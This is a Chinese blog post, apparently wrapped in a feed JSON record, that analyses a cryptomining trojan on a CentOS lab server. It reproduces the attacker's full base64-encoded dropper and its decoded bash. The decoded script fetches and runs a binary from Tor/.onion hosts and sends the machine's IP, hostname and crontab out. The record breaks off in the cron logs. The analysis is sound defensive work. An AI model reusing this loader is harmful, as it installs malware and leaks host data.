{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2022-03-14 18:35:36","updatedTime":"2022-03-14 18:35:36","title":"又一起挖矿木马排查","link":"https://iansmith123.github.io/2021/07/12/tor-miner/","description":"<h1 id=\"序\">序</h1>\n\n<p>组里有同学说他们机器被攻击了 :(</p>\n\n<p><img src=\"https://static.scuseek.com/20210712164644.png\" alt=\"\" /></p>\n\n<p>出现的问题是有个进程占满了 cpu，并且干不掉他</p>\n\n<p><img src=\"https://static.scuseek.com/20210712165007.png\" alt=\"\" /></p>\n\n<p>那么开搞 :)</p>\n\n<h1 id=\"分析\">分析</h1>\n\n<p>登录之后看到了熟悉的随机字符串为文件名的占满了 CPU 的程序</p>\n\n<p><img src=\"https://static.scuseek.com/20210713162517.png\" alt=\"\" /></p>\n\n<p>先想到了上次帮曾大佬同学看的那台机器，于是直奔主题，看看 systemd 里面是谁把他拉起来的</p>\n\n<p><img src=\"https://static.scuseek.com/20210712152849.png\" alt=\"\" /></p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>● session-7.scope - Session 7 of user root\n   Loaded: loaded (/run/systemd/system/session-7.scope; static; vendor preset: disabled)\n  Drop-In: /run/systemd/system/session-7.scope.d\n           └─50-After-systemd-logind\\x2eservice.conf, 50-After-systemd-user-sessions\\x2eservice.conf, 50-Description.conf, 50-SendSIGHUP.conf, 50-Slice.conf, 50-TasksMax.con\nf\n   Active: active (abandoned) since 一 2021-07-12 10:05:01 CST; 4h 52min ago\n   CGroup: /user.slice/user-0.slice/session-7.scope\n           ├─2075 tOAK5Ejl\n           ├─2402 tracepath\n           └─3226 LDi4ZYIl\n\n7月 12 14:47:44 localhost.localdomain crontab[21477]: (root) LIST (root)\n7月 12 14:49:45 localhost.localdomain crontab[21591]: (root) LIST (root)\n7月 12 14:49:46 localhost.localdomain crontab[21654]: (root) LIST (root)\n7月 12 14:49:46 localhost.localdomain crontab[21663]: (root) LIST (root)\n7月 12 14:51:48 localhost.localdomain crontab[21780]: (root) LIST (root)\n7月 12 14:55:50 localhost.localdomain crontab[21971]: (root) LIST (root)\n7月 12 14:55:50 localhost.localdomain crontab[21979]: (root) LIST (root)\n7月 12 14:57:51 localhost.localdomain crontab[22227]: (root) REPLACE (root)\n7月 12 14:57:51 localhost.localdomain crontab[22230]: (root) REPLACE (root)\n7月 12 14:57:52 localhost.localdomain crontab[22289]: (root) LIST (root)\n\n</code></pre></div></div>\n\n<p>真不巧，看起来不是注册到 systemd 的，那么是谁拉起来的呢？</p>\n\n<p>啊，是 crontab（这在我写这篇文章的时候才注意到）</p>\n\n<p>非常不巧，我当时一心想找是哪个 service，没注意到 crontab 的存在，还以为上次的那个挖矿木马换了个 service 的名字，还去这个路径找了好久，找了半天也没有看到恶意的 service 啊</p>\n\n<p>突然想到我还没看 crontab</p>\n\n<p>于是打开crontab</p>\n\n<p>发现了一条指令</p>\n\n<p>他静静的呆在那里</p>\n\n<p>像是在嘲笑我太菜了，这个套路都没注意到 :P</p>\n\n<p>于是，注释掉这行，然后对着刚刚 systemd 输出的三个进程一顿 kill</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>           ├─2075 tOAK5Ejl\n           ├─2402 tracepath\n           └─3226 LDi4ZYIl\n</code></pre></div></div>\n\n<p><img src=\"https://static.scuseek.com/20210712153642.png\" alt=\"\" /></p>\n\n<p>再看看负载，瞬间安静了下来</p>\n\n<p><img src=\"https://static.scuseek.com/20210712153744.png\" alt=\"\" /></p>\n\n<p>似乎暂时搞定了，不排除还有其他后手（事后想想，当时的直觉还是对的hh</p>\n\n<p>不过现在有线索了，去看看恶意文件的内容</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">[</span>root@localhost ~]# <span class=\"nb\">cat</span> .systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh\n<span class=\"c\">#!/bin/bash</span>\n<span class=\"nb\">exec</span> &amp;&gt;/dev/null\n<span class=\"nb\">echo </span>jeAozqLbO5Ni2rtDL7lwAMXluzYQMl\n<span class=\"nb\">echo </span>amVBb3pxTGJPNU5pMnJ0REw3bHdBTVhsdXpZUU1sCmV4ZWMgJj4vZGV2L251bGwKZXhwb3J0IFBBVEg9JFBBVEg6JEhPTUU6L2Jpbjovc2JpbjovdXNyL2JpbjovdXNyL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9sb2Nh\nbC9zYmluCgpkPSQoZ3JlcCB4OiQoaWQgLXUpOiAvZXRjL3Bhc3N3ZHxjdXQgLWQ6IC1mNikKYz0kKGVjaG8gImN1cmwgLTRmc1NMa0EtIC1tMjAwIikKdD0kKGVjaG8gImJnZ3RzNTQ3Z3VraHZtZjRjZ2FuZGxneHhwaGVuZ3hvd\nm95bzZld2huczVxbW1iMmI1b2k0M3lkIikKCnNvY2t6KCkgewpuPShkb2gudGhpcy53ZWIuaWQgZG9oLnBvc3QtZmFjdHVtLnRrIGRucy5ob3N0dXgubmV0IHVuY2Vuc29yZWQubHV4MS5kbnMubml4bmV0Lnh5eiBkbnMucnVieW\nZpc2guY24gZG5zLnR3bmljLnR3IGRvaC1maS5ibGFoZG5zLmNvbSBmaS5kb2guZG5zLnNub3B5dGEub3JnIHJlc29sdmVyLWV1LmxlbHV4LmZpIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyA\niZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMSkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAn\nXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY\n2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbW\nF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQ\noY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iy\nd2ViLmluIHRvcjJ3ZWIuaXQKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wM\n<span class=\"nv\">Skvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo</span><span class=\"o\">=</span>|base64 <span class=\"nt\">-d</span>\n|bash\n\n</code></pre></div></div>\n\n<p>并不简短的程序，主要内容是一个用 base64 编码后的命令，解开之后内容如下：</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>jeAozqLbO5Ni2rtDL7lwAMXluzYQMl\n<span class=\"nb\">exec</span> &amp;&gt;/dev/null\n<span class=\"nb\">export </span><span class=\"nv\">PATH</span><span class=\"o\">=</span><span class=\"nv\">$PATH</span>:<span class=\"nv\">$HOME</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\n\n<span class=\"nv\">d</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">grep </span>x:<span class=\"si\">$(</span><span class=\"nb\">id</span> <span class=\"nt\">-u</span><span class=\"si\">)</span>: /etc/passwd|cut <span class=\"nt\">-d</span>: <span class=\"nt\">-f6</span><span class=\"si\">)</span>\n<span class=\"nv\">c</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"curl -4fsSLkA- -m200\"</span><span class=\"si\">)</span>\n<span class=\"nv\">t</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"bggts547gukhvmf4cgandlgxxphengxovoyo6ewhns5qmmb2b5oi43yd\"</span><span class=\"si\">)</span>\n\nsockz<span class=\"o\">()</span> <span class=\"o\">{</span>\n<span class=\"nv\">n</span><span class=\"o\">=(</span>doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com <span class=\"k\">fi</span>.doh.dns.snopyta.org resolver-eu.lelux.\n<span class=\"k\">fi </span>doh.li dns.digitale-gesellschaft.ch<span class=\"o\">)</span>\n<span class=\"nv\">p</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"dns-query?name=relay.tor2socks.in\"</span><span class=\"si\">)</span>\n<span class=\"nv\">s</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nv\">$c</span> https://<span class=\"k\">${</span><span class=\"nv\">n</span><span class=\"p\">[</span><span class=\"k\">$((</span>RANDOM%11<span class=\"k\">))</span><span class=\"p\">]</span><span class=\"k\">}</span>/<span class=\"nv\">$p</span> | <span class=\"nb\">grep</span> <span class=\"nt\">-oE</span> <span class=\"s2\">\"</span><span class=\"se\">\\b</span><span class=\"s2\">([0-9]{1,3}</span><span class=\"se\">\\.</span><span class=\"s2\">){3}[0-9]{1,3}</span><span class=\"se\">\\b</span><span class=\"s2\">\"</span> |tr <span class=\"s1\">' '</span> <span class=\"s1\">'\\n'</span>|grep <span class=\"nt\">-Ev</span> <span class=\"o\">[</span>.]0|sort <span class=\"nt\">-uR</span>|head <span class=\"nt\">-n</span> 1<span class=\"si\">)</span>\n<span class=\"o\">}</span>\n\nfexe<span class=\"o\">()</span> <span class=\"o\">{</span>\n<span class=\"k\">for </span>i <span class=\"k\">in</span> <span class=\"nb\">.</span> <span class=\"nv\">$HOME</span> /usr/bin <span class=\"nv\">$d</span> /var/tmp <span class=\"p\">;</span><span class=\"k\">do </span><span class=\"nb\">echo exit</span> <span class=\"o\">&gt;</span> <span class=\"nv\">$i</span>/i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">chmod</span> +x <span class=\"nv\">$i</span>/i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">cd</span> <span class=\"nv\">$i</span> <span class=\"o\">&amp;&amp;</span> ./i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">rm</span> <span class=\"nt\">-f</span> i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">break</span><span class=\"p\">;</span><span class=\"k\">done</span>\n<span class=\"o\">}</span>\n\nu<span class=\"o\">()</span> <span class=\"o\">{</span>\nsockz\n<span class=\"nv\">f</span><span class=\"o\">=</span>/int.<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-m</span><span class=\"si\">)</span>\n<span class=\"nv\">x</span><span class=\"o\">=</span>./<span class=\"si\">$(</span><span class=\"nb\">date</span>|md5sum|cut <span class=\"nt\">-f1</span> <span class=\"nt\">-d-</span><span class=\"si\">)</span>\n<span class=\"nv\">r</span><span class=\"o\">=</span><span class=\"si\">$(</span>curl <span class=\"nt\">-4fsSLk</span> checkip.amazonaws.com||curl <span class=\"nt\">-4fsSLk</span> ip.sb<span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">whoami</span><span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-m</span><span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-n</span><span class=\"si\">)</span>_<span class=\"si\">$(</span>ip a|grep <span class=\"s1\">'inet '</span>|awk <span class=\"o\">{</span><span class=\"s1\">'print $2'</span><span class=\"o\">}</span>|md5sum|awk <span class=\"o\">{</span><span class=\"s1\">'print $1'</span><span class=\"o\">}</span><span class=\"si\">)</span>_<span class=\"si\">$(</span>crontab <span class=\"nt\">-l</span>|base\n64 <span class=\"nt\">-w0</span><span class=\"si\">)</span>\n<span class=\"nv\">$c</span> <span class=\"nt\">-x</span> socks5h://<span class=\"nv\">$s</span>:9050 <span class=\"nv\">$t</span>.onion<span class=\"nv\">$f</span> <span class=\"nt\">-o</span><span class=\"nv\">$x</span> <span class=\"nt\">-e</span><span class=\"nv\">$r</span> <span class=\"o\">||</span> <span class=\"nv\">$c</span> <span class=\"nv\">$1$f</span> <span class=\"nt\">-o</span><span class=\"nv\">$x</span> <span class=\"nt\">-e</span><span class=\"nv\">$r</span>\n<span class=\"nb\">chmod</span> +x <span class=\"nv\">$x</span><span class=\"p\">;</span><span class=\"nv\">$x</span><span class=\"p\">;</span><span class=\"nb\">rm</span> <span class=\"nt\">-f</span> <span class=\"nv\">$x</span>\n<span class=\"o\">}</span>\n\n<span class=\"k\">for </span>h <span class=\"k\">in </span>tor2web.in tor2web.it\n<span class=\"k\">do\nif</span> <span class=\"o\">!</span> <span class=\"nb\">ls</span> /proc/<span class=\"si\">$(</span><span class=\"nb\">head</span> <span class=\"nt\">-n</span> 1 /tmp/.X11-unix/01<span class=\"si\">)</span>/status<span class=\"p\">;</span> <span class=\"k\">then\n</span>fexe<span class=\"p\">;</span>u <span class=\"nv\">$t</span>.<span class=\"nv\">$h</span>\n<span class=\"nb\">ls</span> /proc/<span class=\"si\">$(</span><span class=\"nb\">head</span> <span class=\"nt\">-n</span> 1 /tmp/.X11-unix/01<span class=\"si\">)</span>/status <span class=\"o\">||</span> <span class=\"o\">(</span><span class=\"nb\">cd</span> /tmp<span class=\"p\">;</span>u <span class=\"nv\">$t</span>.<span class=\"nv\">$h</span><span class=\"o\">)</span>\n<span class=\"nb\">ls</span> /proc/<span class=\"si\">$(</span><span class=\"nb\">head</span> <span class=\"nt\">-n</span> 1 /tmp/.X11-unix/01<span class=\"si\">)</span>/status <span class=\"o\">||</span> <span class=\"o\">(</span><span class=\"nb\">cd</span> /dev/shm<span class=\"p\">;</span>u <span class=\"nv\">$t</span>.<span class=\"nv\">$h</span><span class=\"o\">)</span>\n<span class=\"k\">else\n</span><span class=\"nb\">break\n</span><span class=\"k\">fi\ndone</span>\n\n</code></pre></div></div>\n\n<p>第一行随机字符串是干嘛的，我暂且不知道，这样应该会失败吧..</p>\n\n<p>也不一定，除非，除非这是个可执行文件 :)</p>\n\n<p>那么搜一下有没有这个可执行文件</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>find / 2&gt;/dev/null |grep jeAozqLbO5Ni2rtDL7lwA\n</code></pre></div></div>\n\n<p>发现了另外的有趣的东西</p>\n\n<p><img src=\"https://static.scuseek.com/20210712154430.png\" alt=\"\" /></p>\n\n<p>再仔细看看，好家伙，还有后手</p>\n\n<p><img src=\"https://static.scuseek.com/20210712154419.png\" alt=\"\" /></p>\n\n<p>更坏的消息是，现在应该刚过了15:29，可能他又启动了</p>\n\n<p>再看一看进程列表，果然。</p>\n\n<p><img src=\"https://static.scuseek.com/20210712155201.png\" alt=\"\" /></p>\n\n<p>要不是我想着摸鱼写一篇文章记录下，我可能就已经跑路，看不到这个剧情了 :)</p>\n\n<p>这次不能轻易的放过他了 :)</p>\n\n<p>先不急着杀掉他，把他的二进制搞出来分析分析</p>\n\n<p>虽然文件被删了，但是他的文件描述符还在，所以直接把他复制出来看看，我觉得又可以丢给曾大佬玩了 :)<img src=\"https://static.scuseek.com/20210712155342.png\" alt=\"\" /></p>\n\n<p>小插曲解决掉了，那么继续分析 bash 脚本。</p>\n\n<p>为了方便阅读，我替换了一些变量名，原始的 bash 脚本可以看前面解码的内容 :)</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sockz<span class=\"o\">()</span> <span class=\"o\">{</span>\n<span class=\"nv\">n</span><span class=\"o\">=(</span>doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com <span class=\"k\">fi</span>.doh.dns.snopyta.org resolver-eu.lelux.\n<span class=\"k\">fi </span>doh.li dns.digitale-gesellschaft.ch<span class=\"o\">)</span>\n<span class=\"nv\">p</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"dns-query?name=relay.tor2socks.in\"</span><span class=\"si\">)</span>\n<span class=\"nv\">s</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nv\">$c</span> https://<span class=\"k\">${</span><span class=\"nv\">n</span><span class=\"p\">[</span><span class=\"k\">$((</span>RANDOM%11<span class=\"k\">))</span><span class=\"p\">]</span><span class=\"k\">}</span>/<span class=\"nv\">$p</span> | <span class=\"nb\">grep</span> <span class=\"nt\">-oE</span> <span class=\"s2\">\"</span><span class=\"se\">\\b</span><span class=\"s2\">([0-9]{1,3}</span><span class=\"se\">\\.</span><span class=\"s2\">){3}[0-9]{1,3}</span><span class=\"se\">\\b</span><span class=\"s2\">\"</span> |tr <span class=\"s1\">' '</span> <span class=\"s1\">'\\n'</span>|grep <span class=\"nt\">-Ev</span> <span class=\"o\">[</span>.]0|sort <span class=\"nt\">-uR</span>|head <span class=\"nt\">-n</span> 1<span class=\"si\">)</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n\n<p><code class=\"language-plaintext highlighter-rouge\">sockz</code>函数看起来是想要通过 doh 查询 ip,这一招可以说是很妙了，直接绕过了各大厂商IDS里面恶意域名的 IOC。其中 <code class=\"language-plaintext highlighter-rouge\">dns.rubyfish.cn</code> 这个域名，以及后面出现的<code class=\"language-plaintext highlighter-rouge\">ip.sb</code>，这两个域名在国内的互联网圈子里面可能比较流行，暂不清楚在国外的知名度有多少。所以我可能比较倾向于这个挖矿木马是国内的黑产团队搞的。</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>fexe<span class=\"o\">()</span> <span class=\"o\">{</span>\n<span class=\"k\">for </span>i <span class=\"k\">in</span> <span class=\"nb\">.</span> <span class=\"nv\">$HOME</span> /usr/bin /root /var/tmp <span class=\"p\">;</span><span class=\"k\">do </span><span class=\"nb\">echo exit</span> <span class=\"o\">&gt;</span> <span class=\"nv\">$i</span>/i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">chmod</span> +x <span class=\"nv\">$i</span>/i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">cd</span> <span class=\"nv\">$i</span> <span class=\"o\">&amp;&amp;</span> ./i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">rm</span> <span class=\"nt\">-f</span> i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">break</span><span class=\"p\">;</span><span class=\"k\">done</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n\n<p><code class=\"language-plaintext highlighter-rouge\">fexe</code> 看起来是在这几个路径里面寻找一个有读写权限的路径。</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>u<span class=\"o\">()</span> <span class=\"o\">{</span>\nsockz\n<span class=\"nv\">f</span><span class=\"o\">=</span>/int.<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-m</span><span class=\"si\">)</span>\n<span class=\"nv\">x</span><span class=\"o\">=</span>./<span class=\"si\">$(</span><span class=\"nb\">date</span>|md5sum|cut <span class=\"nt\">-f1</span> <span class=\"nt\">-d-</span><span class=\"si\">)</span>\n<span class=\"nv\">r</span><span class=\"o\">=</span><span class=\"si\">$(</span>curl <span class=\"nt\">-4fsSLk</span> checkip.amazonaws.com||curl <span class=\"nt\">-4fsSLk</span> ip.sb<span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">whoami</span><span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-m</span><span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-n</span><span class=\"si\">)</span>_<span class=\"si\">$(</span>ip a|grep <span class=\"s1\">'inet '</span>|awk <span class=\"o\">{</span><span class=\"s1\">'print $2'</span><span class=\"o\">}</span>|md5sum|awk <span class=\"o\">{</span><span class=\"s1\">'print $1'</span><span class=\"o\">}</span><span class=\"si\">)</span>_<span class=\"si\">$(</span>crontab <span class=\"nt\">-l</span>|base\n64 <span class=\"nt\">-w0</span><span class=\"si\">)</span>\ncurl <span class=\"nt\">-x</span> socks5h://<span class=\"nv\">$s</span>:9050 bggts547gukhvmf4cgandlgxxphengxovoyo6ewhns5qmmb2b5oi43yd.onion<span class=\"nv\">$f</span> <span class=\"nt\">-oevil_file_name</span> <span class=\"nt\">-e</span><span class=\"nv\">$r</span> <span class=\"o\">||</span> curl <span class=\"nv\">$1$f</span> <span class=\"nt\">-oevil_file_name</span> <span class=\"nt\">-e</span><span class=\"nv\">$r</span>\n<span class=\"nb\">chmod</span> +x evil_file_name<span class=\"p\">;</span>evil_file_name<span class=\"p\">;</span><span class=\"nb\">rm</span> <span class=\"nt\">-f</span> evil_file_name\n<span class=\"o\">}</span>\n</code></pre></div></div>\n\n<p>函数 <code class=\"language-plaintext highlighter-rouge\">u()</code> 是主要内容了，他生成了随机的文件名，通过 tor 代理，根据设备的架构下载了一个恶意文件<code class=\"language-plaintext highlighter-rouge\">/int.$(uname -m)</code>，如<code class=\"language-plaintext highlighter-rouge\">/int.x86_64</code>，然后执行这个恶意文件并且删除他。</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"si\">$(</span>curl <span class=\"nt\">-4fsSLk</span> checkip.amazonaws.com||curl <span class=\"nt\">-4fsSLk</span> ip.sb<span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">whoami</span><span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-m</span><span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-n</span><span class=\"si\">)</span>_<span class=\"si\">$(</span>ip a|grep <span class=\"s1\">'inet '</span>|awk <span class=\"o\">{</span><span class=\"s1\">'print $2'</span><span class=\"o\">}</span>|md5sum|awk <span class=\"o\">{</span><span class=\"s1\">'print $1'</span><span class=\"o\">}</span><span class=\"si\">)</span>_<span class=\"si\">$(</span>crontab <span class=\"nt\">-l</span>|base\n64 <span class=\"nt\">-w0</span><span class=\"si\">)</span>\n</code></pre></div></div>\n\n<p>这一行把设备的一些基本信息打包了一下，包括 ip地址、主机名、crontab内容。这里是 or 的关系，推测是如果执行失败那就上报设备信息。</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">for </span>h <span class=\"k\">in </span>tor2web.in tor2web.it\n<span class=\"k\">do\nif</span> <span class=\"o\">!</span> <span class=\"nb\">ls</span> /proc/<span class=\"si\">$(</span><span class=\"nb\">head</span> <span class=\"nt\">-n</span> 1 /tmp/.X11-unix/01<span class=\"si\">)</span>/status<span class=\"p\">;</span> <span class=\"k\">then\n</span>fexe<span class=\"p\">;</span>u <span class=\"nv\">$t</span>.<span class=\"nv\">$h</span>\n<span class=\"nb\">ls</span> /proc/<span class=\"si\">$(</span><span class=\"nb\">head</span> <span class=\"nt\">-n</span> 1 /tmp/.X11-unix/01<span class=\"si\">)</span>/status <span class=\"o\">||</span> <span class=\"o\">(</span><span class=\"nb\">cd</span> /tmp<span class=\"p\">;</span>u <span class=\"nv\">$t</span>.<span class=\"nv\">$h</span><span class=\"o\">)</span>\n<span class=\"nb\">ls</span> /proc/<span class=\"si\">$(</span><span class=\"nb\">head</span> <span class=\"nt\">-n</span> 1 /tmp/.X11-unix/01<span class=\"si\">)</span>/status <span class=\"o\">||</span> <span class=\"o\">(</span><span class=\"nb\">cd</span> /dev/shm<span class=\"p\">;</span>u <span class=\"nv\">$t</span>.<span class=\"nv\">$h</span><span class=\"o\">)</span>\n<span class=\"k\">else\n</span><span class=\"nb\">break\n</span><span class=\"k\">fi\ndone</span>\n</code></pre></div></div>\n\n<p>程序执行流程就比较容易看懂，根据 pid 文件判断程序是否启动了，如果没启动，那么就启动程序。</p>\n\n<h1 id=\"二进制文件分析\">二进制文件分析</h1>\n\n<p>这个二进制文件什么都过滤不出来，但是过滤出来了一个字符串：</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>PROT_EXEC|PROT_WRITE failed.\n</code></pre></div></div>\n\n<p><img src=\"https://static.scuseek.com/20210712171324.png\" alt=\"\" /></p>\n\n<p>搜一下这个字符串，可以发现有人在 stackoverflow 提了这样一个<a href=\"https://unix.stackexchange.com/questions/419242/strange-linux-binary\">问题</a>，问题的内容里面有这个关键字</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>$strings exe_file\nUPX!\n.....\nPROT_EXEC|PROT_WRITE failed.\n$Info: This file is packed with the UPX executable packer http://upx.sf.net $\n$Id: UPX 3.91 Copyright (C) 1996-2013 the UPX Team. All Rights Reserved. $\n</code></pre></div></div>\n\n<p>看到了 upx 不禁眼前一亮，我之前就猜测这是 upx 加壳了，但是去除了 upx 的特征，导致过滤不出任何关键字来。</p>\n\n<p>那么 <code class=\"language-plaintext highlighter-rouge\">upx -d</code> 一把梭</p>\n\n<p><img src=\"https://static.scuseek.com/20210712171854.png\" alt=\"\" /></p>\n\n<p>非常棒，不能一键脱壳，那么我搞不动了 :)</p>\n\n<p>找了些 upx 去特征的帖子，看了后我不想动手了，太多可以玩的地方了</p>\n\n<p>首先，他可能去掉了一些 upx 识别自己压缩过的特征字符串，不过这个可以自己新建一个 upx 文件把内容复制过来。</p>\n\n<p>其次，我不知道他是哪一种压缩等级，不过这个可以枚举解决，只是可能会花点时间。</p>\n\n<p>最重要的一点，又到了组会的时候了，我不能再摸鱼了，不然导师问我干了啥，我又啥也没干 :)</p>\n\n<p>这个问题暂时就不搞了 :)</p>\n\n<h1 id=\"入侵溯源\">入侵溯源</h1>\n\n<p>那么对面是怎么打进来的呢？</p>\n\n<p>centos7有记录 crontab 日志的地方，查看 crontab 的编辑记录就知道是在9号下午 12:55:01 首次编辑 crontab 的</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>[root@localhost log]# cat cron*|grep RELOAD\nJul 12 12:38:01 localhost crond[12721]: (root) RELOAD (/var/spool/cron/root)\nJul 12 15:08:01 localhost crond[22892]: (root) RELOAD (/var/spool/cron/root)\nJul 12 15:34:01 localhost crond[25783]: (root) RELOAD (/var/spool/cron/root)\nJul  9 12:55:01 localhost crond[2554]: (root) RELOAD (/var/spool/cron/root)\nJul  9 14:30:01 localhost crond[15227]: (root) RELOAD (/var/spool/cron/root)\nJul  9 15:37:01 localhost crond[24166]: (root) RELOAD (/var/spool/cron/root)\n\n</code></pre></div></div>\n\n<p>那么，从<code class=\"language-plaintext highlighter-rouge\">2021.6.13</code> 开始，到<code class=\"language-plaintext highlighter-rouge\">2021.7.12</code>，执行的crontab的记录再反复过滤，运用人工的启发式搜索算法 :)</p>\n\n<p><img src=\"https://static.scuseek.com/20210712193241.png\" alt=\"\" /></p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>Jul 12 10:29:01 localhost CROND[4295]: (root) CMD (/opt/systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)Jul 12 11:29:01 localhost CROND[8070]: (root) CMD (/opt/systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul 12 12:05:01 localhost CROND[10604]: (root) CMD (/root/.systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul 12 12:29:01 localhost CROND[12158]: (root) CMD (/opt/systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul 12 13:05:01 localhost CROND[14585]: (root) CMD (/root/.systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul 12 14:05:01 localhost CROND[18502]: (root) CMD (/root/.systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul 12 14:29:01 localhost CROND[20237]: (root) CMD 